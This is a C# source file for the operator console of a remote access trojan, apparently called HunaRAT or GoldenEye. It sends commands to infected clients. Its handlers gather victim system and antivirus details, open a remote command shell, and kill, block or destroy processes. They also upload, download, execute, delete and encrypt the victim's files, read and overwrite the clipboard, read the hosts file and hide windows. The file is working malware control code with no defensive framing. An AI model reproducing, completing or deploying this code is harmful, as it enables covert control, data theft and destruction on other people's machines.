using GoldenEye_Remote_Administration_Tool;
using Microsoft.VisualBasic;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace HunaRAT.Forms
{
    public partial class ClientManager : Form
    {
        public Connection clientLcl;
        public string containerText = "Client Manager";
        public Form1 frm1;
        public string clientID;
        public string country;
        public string clientPath;
        public string privs;
        public string OperatingSystem;
        public string activeWindow;
        public string antivirus;
        public string systemUptime;
        public string MachineName;
        public string UserName;
        public string machineType;
        public string CPU;
        public string GPU;
        public string InstalledRAM;
        public string MonitorCount;

        public ClientManager()
        {
            InitializeComponent();
        }

        public void setClientInfo()
        {
            TreeView1.Nodes[0].Nodes[0].Text = TreeView1.Nodes[0].Nodes[0].Text + clientID;
            TreeView1.Nodes[0].Nodes[1].Text = TreeView1.Nodes[0].Nodes[1].Text + country;
            TreeView1.Nodes[0].Nodes[2].Text = TreeView1.Nodes[0].Nodes[2].Text + clientPath;
            TreeView1.Nodes[0].Nodes[3].Text = TreeView1.Nodes[0].Nodes[3].Text + privs;

            TreeView1.Nodes[1].Nodes[0].Text = TreeView1.Nodes[1].Nodes[0].Text + OperatingSystem;
            TreeView1.Nodes[1].Nodes[1].Text = TreeView1.Nodes[1].Nodes[1].Text + activeWindow;
            TreeView1.Nodes[1].Nodes[2].Text = TreeView1.Nodes[1].Nodes[2].Text + antivirus;
            TreeView1.Nodes[1].Nodes[3].Text = TreeView1.Nodes[1].Nodes[3].Text + systemUptime;
            TreeView1.Nodes[1].Nodes[4].Text = TreeView1.Nodes[1].Nodes[4].Text + MachineName;
            TreeView1.Nodes[1].Nodes[5].Text = TreeView1.Nodes[1].Nodes[5].Text + UserName;

            TreeView1.Nodes[2].Nodes[0].Text = TreeView1.Nodes[2].Nodes[0].Text + machineType;
            TreeView1.Nodes[2].Nodes[1].Text = TreeView1.Nodes[2].Nodes[1].Text + CPU;
            TreeView1.Nodes[2].Nodes[2].Text = TreeView1.Nodes[2].Nodes[2].Text + GPU;
            TreeView1.Nodes[2].Nodes[3].Text = TreeView1.Nodes[2].Nodes[3].Text + InstalledRAM;
            TreeView1.Nodes[2].Nodes[4].Text = TreeView1.Nodes[2].Nodes[4].Text + MonitorCount;
        }

        private void ClientManager_Load(object sender, EventArgs e)
        {
            velyseForm1.Text = containerText;
            clientLcl.Send("ADVINFO");
        }

        public void addToCMD(string text)
        {
            richTextBox2.Text += text.Replace("[newline]", Environment.NewLine);
        }

        private void TreeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
        }

        private void themeContainer1_Click(object sender, EventArgs e)
        {
        }

        private void button1_Click(object sender, EventArgs e)
        {
        }

        private void copyValueToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(TreeView1.SelectedNode.Text);
        }

        private void refreshProcessListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
            {
                item.Remove();
            }
            clientLcl.Send("REQPROCL");
        }

        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clientLcl.Send("KILLPROC|" + item.SubItems[1].Text);
                item.Remove();
            }
        }

        private void processNameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string procname = Interaction.InputBox("Enter the Process Name of the Process you are looking for", "Search Processes", "chrome", 0, 0);

            listView1.BeginUpdate();
            foreach (ListViewItem item in listView1.Items)
            {
                if (item.Text.Contains(procname))
                {
                    item.Selected = true;
                    listView1.EndUpdate();
                    MessageBox.Show("Process has been found and selected!");
                    return;
                }
            }
            MessageBox.Show("Couldnt find Process by the provided Process Name!");
            listView1.EndUpdate();
        }

        private bool isCmdStarted = false;

        private void button2_Click(object sender, EventArgs e)
        {
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            if (isCmdStarted)
            {
                String command = "EXRCMD|" + t_TextBox2.Text; // Befehl zusammen Bauen
                t_TextBox2.Text = "";
                if (command == "EXRCMD|cls" || command == "EXRCMD|clear") // Wenn die nur cls machen wollen
                {
                    richTextBox2.Clear(); // Einfach nur die box leeren local
                    return;
                }
                clientLcl.Send(command);
            }
            else if (!isCmdStarted) // Wenn remote cmd noch nicht stub sided ausgeführt wurde
            {
                MessageBox.Show(this, "The Remote Command Prompt Session is not started yet!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning); // Warnung ausgeben
            }
        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            clientLcl.Send("FILEMGR|listDrives");
        }

        private void listView2_SelectedIndexChanged(object sender, EventArgs e)
        {
        }

        private void ListView2_DoubleClick(object sender, EventArgs e)
        {
            if (listView2.SelectedItems.Count == 0)
                return;

            if (listView2.SelectedItems[0].Text.Contains(@":\"))
            {
                txtLocation.Text = listView2.SelectedItems[0].Text;
                RequestFileList(txtLocation.Text);
                return;
            }

            foreach (ListViewItem item in listView2.SelectedItems)
            {
                if (item.Text == "...")
                {
                    if (listView2.SelectedItems.Count > 1)
                    {
                        return;
                    }
                    if (txtLocation.Text.Length == 3)
                    {
                        foreach (ListViewItem item2 in listView2.Items)
                        {
                            item2.Remove();
                        }
                        clientLcl.Send("FILEMGR|listDrives");
                        return;
                    }
                    try
                    {
                        string previousState = txtLocation.Text;
                        txtLocation.Text = txtLocation.Text.Substring(0, txtLocation.Text.LastIndexOf("\\"));
                        txtLocation.Text = txtLocation.Text.Substring(0, txtLocation.Text.LastIndexOf("\\") + 1);

                        if (txtLocation.Text.Length < 3)
                            txtLocation.Text = previousState;
                        else
                            RequestFileList(txtLocation.Text);
                        return;
                    }
                    catch { }
                }
                if (item.SubItems[1].Text == "Folder")
                {
                    txtLocation.Text += item.Text + @"\";
                    RequestFileList(txtLocation.Text);
                }
            }
        }

        private void RequestFileList(string location)
        {
            listView2.Items.Clear();
            clientLcl.Send("FILEMGR|listdir|" + location);
        }

        private void executeFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                if (item.SubItems[1].Text == "File")
                {
                    clientLcl.Send("FILEMGR|excfile|" + txtLocation.Text + item.Text);
                }
                else
                {
                    MessageBox.Show("You can only execute Files!");
                }
            }
        }

        private void toolStripSeparator4_Click(object sender, EventArgs e)
        {
        }

        private void refreshDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            refreshDir();
        }

        private void refreshDir()
        {
            listView2.Items.Clear();
            clientLcl.Send("FILEMGR|listdir|" + txtLocation.Text);
        }

        private void deleteFolderFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                if (item.SubItems[1].Text == "File")
                {
                    clientLcl.Send("FILEMGR|delfile|" + txtLocation.Text + item.Text);
                }
                else if (item.SubItems[1].Text == "Folder")
                {
                    clientLcl.Send("FILEMGR|delfolder|" + txtLocation.Text + item.Text);
                }
                item.Remove();
            }
        }

        private void blockFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                if (item.SubItems[1].Text == "File")
                {
                    clientLcl.Send("FILEMGR|blockfile|" + txtLocation.Text + item.Text);
                }
                else if (item.SubItems[1].Text == "Folder")
                {
                    clientLcl.Send("FILEMGR|blockfolder|" + txtLocation.Text + item.Text);
                }
            }
        }

        private void searchDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string clientID = Interaction.InputBox("Enter the Name of the Folder you are looking for", "Search Filesystem", "", 0, 0);

            listView2.BeginUpdate();
            foreach (ListViewItem item in listView2.Items)
            {
                if (item.Text.Equals(clientID) && item.SubItems[1].Text.Equals("Folder"))
                {
                    item.Selected = true;
                    listView2.EndUpdate();
                    MessageBox.Show("Folder has been found and selected!");
                    return;
                }
            }
            MessageBox.Show("Couldnt find Folder by the provided Name!");
            listView2.EndUpdate();
        }

        private void createDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (txtLocation.Text.Length > 3)
            {
                string foldername = Interaction.InputBox("Enter the Name of the Directory you want to create", "Create Directory", "New Folder", 0, 0);
                clientLcl.Send("FILEMGR|createfolder|" + txtLocation.Text + foldername);
                RequestFileList(txtLocation.Text);
            }
            else
            {
                MessageBox.Show("You cant create a Directory here!");
            }
        }

        private void txtLocation_TextChanged(object sender, EventArgs e)
        {
        }

        private void button4_Click(object sender, EventArgs e)
        {
            listView2.Items.Clear();
            clientLcl.Send("FILEMGR|listDrives");
        }

        private void downloadFIleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string selectedItemName = string.Empty;
            if (listView2.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please do not download more than one file at once!");
                return;
            }
            foreach (ListViewItem item3 in listView2.SelectedItems)
            {
                if (item3.SubItems[1].Text == "File")
                {
                    clientLcl.Send("FILEMGR|dlfile|" + txtLocation.Text + item3.Text + "|" + item3.Text);
                    selectedItemName = item3.Text;
                }
                else if (item3.SubItems[1].Text == "Folder")
                {
                    MessageBox.Show("You cant download Folders!");
                    return;
                }
                ListViewItem item = new ListViewItem();
                item.Text = clientID;
                item.SubItems.Add("File Manager");
                item.SubItems.Add(item3.Text);
                item.SubItems.Add(item3.SubItems[2].Text);
                item.SubItems.Add(Application.StartupPath + @"\Client Data\" + clientID + @"\Downloaded Files\" + item3.Text);
                item.SubItems.Add(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss"));
                // item.ImageKey = "Key2_16px.png";
                item.ForeColor = Color.Orange;
                frm1.listView3.Items.Add(item);
            }
            // clientID
        }

        private void uploadFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog res = new OpenFileDialog();
            res.Filter = "All Files|*.*";
            res.Title = "[File Manager] Select a File to upload";

            if (res.ShowDialog() == DialogResult.OK)
            {
                string filePath = res.FileName;
                string converted = Convert.ToBase64String(File.ReadAllBytes(filePath));
                string onlyFileName = System.IO.Path.GetFileName(res.FileName);
                clientLcl.Send("FILEMGR|uplfile|" + txtLocation.Text + @"\" + onlyFileName + "|" + converted);
            }
        }

        private void searchForFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string clientID = Interaction.InputBox("Enter the Name of the File you are looking for", "Search Filesystem", "", 0, 0);

            listView2.BeginUpdate();
            foreach (ListViewItem item in listView2.Items)
            {
                if (item.Text.Equals(clientID) && item.SubItems[1].Text.Equals("File"))
                {
                    item.Selected = true;
                    listView2.EndUpdate();
                    MessageBox.Show("File has been found and selected!");
                    return;
                }
            }
            MessageBox.Show("Couldnt find File by the provided Name!");
            listView2.EndUpdate();
        }

        private void unblockItemsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                if (item.SubItems[1].Text == "File")
                {
                    clientLcl.Send("FILEMGR|unblockfile|" + txtLocation.Text + item.Text);
                }
                else if (item.SubItems[1].Text == "Folder")
                {
                    clientLcl.Send("FILEMGR|unblockfolder|" + txtLocation.Text + item.Text);
                }
            }
        }

        private void velyseForm1_Click(object sender, EventArgs e)
        {
        }

        private void killProcessToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clientLcl.Send("KILLPROC|" + item.SubItems[1].Text);
                item.Remove();
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item2 in listView1.SelectedItems)
            {
                clientLcl.Send("DLBPROC|" + item2.SubItems[1].Text);
                if (listView2.SelectedItems.Count > 1)
                {
                    MessageBox.Show("Please do not download more than one file at once!");
                    return;
                }

                ListViewItem item = new ListViewItem();
                item.Text = clientID;
                item.SubItems.Add("Task Manager");
                item.SubItems.Add(item2.Text);
                item.SubItems.Add("Unknown");
                item.SubItems.Add(Application.StartupPath + @"\Client Data\" + clientID + @"\Downloaded Files\" + item2.Text);
                item.SubItems.Add(DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss"));
                // item.ImageKey = "Key2_16px.png";
                item.ForeColor = Color.Orange;
                frm1.listView3.Items.Add(item);
                // clientID
            }
        }

        private void killAndBlockToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clientLcl.Send("KADELBPROC|" + item.SubItems[1].Text);
                item.Remove();
            }
        }

        private void destroyProcessFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clientLcl.Send("DEBLOPROC|" + item.SubItems[1].Text);
                item.ForeColor = Color.Red;
                item.Remove();
            }
        }

        private void tabPage5_Click(object sender, EventArgs e)
        {
        }

        private void velyseButton1_Click(object sender, EventArgs e)
        {
            listView2.Items.Clear();
            clientLcl.Send("FILEMGR|listDrives");
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            if (button2.Text == "Start Command Prompt Session")
            {
                clientLcl.Send("STARTCMD");
                button2.Text = "Stop Command Prompt Session";
                isCmdStarted = true;
            }
            else
            {
                clientLcl.Send("STOPCMD");
                button2.Text = "Start Command Prompt Session";
                isCmdStarted = false;
                richTextBox2.Clear();
            }
        }

        private void refreshListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView3.Items)
            {
                item.Remove();
            }
            clientLcl.Send("WDMGR|list");
        }

        private void renameWindowTitleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please do not select more than one Window!");
                return;
            }
            string newName = Interaction.InputBox("Enter the new Window Title below", "Rename Window", listView3.SelectedItems[0].Text, 0, 0);
            clientLcl.Send("WDMGR|rename|" + listView3.SelectedItems[0].Text + "|" + newName);
        }

        private void maximizeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            clientLcl.Send("WDMGR|maximize|" + listView3.SelectedItems[0].Text);
        }

        private void minimizeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            clientLcl.Send("WDMGR|minimize|" + listView3.SelectedItems[0].Text);
        }

        private void hideWindowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            clientLcl.Send("WDMGR|hide|" + listView3.SelectedItems[0].Text);
        }

        private void showWindowToolStripMenuItem_Click(object sender, EventArgs e)
        {
            clientLcl.Send("WDMGR|show|" + listView3.SelectedItems[0].Text);
        }

        private void velyseButton2_Click(object sender, EventArgs e)
        {
            clientLcl.Send("CLIBPOARD|get");
        }

        private void velyseButton3_Click(object sender, EventArgs e)
        {
            clientLcl.Send("CLIBPOARD|set|" + richTextBox1.Text.Replace(Environment.NewLine, "[newline]").Replace("|", "/"));
        }

        private void velyseButton5_Click(object sender, EventArgs e)
        {
            clientLcl.Send("HOSTS|get|");
        }

        private void encryptFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please do not select more than one File!");
                return;
            }
            string cryptpw = Interaction.InputBox("Enter the Encryption Password", "Encryption Key", "testkey", 0, 0);

            clientLcl.Send("FILEMGR|enfile|" + txtLocation.Text + listView2.SelectedItems[0].Text + "|" + cryptpw.Replace("|", "/"));

        }

        private void decryptFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems.Count > 1)
            {
                MessageBox.Show("Please do not select more than one File!");
                return;
            }
            string cryptpw = Interaction.InputBox("Enter the Decryption Password", "Decryption Key", "testkey", 0, 0);

            clientLcl.Send("FILEMGR|defile|" + txtLocation.Text + listView2.SelectedItems[0].Text + "|" + cryptpw.Replace("|", "/"));

        }

        private void velyseButton4_Click(object sender, EventArgs e)
        {
          //  clientLcl.Send("HOSTS|set|" + richTextBox3.Text.Replace(Environment.NewLine, "[newline]"));

        }
    }
}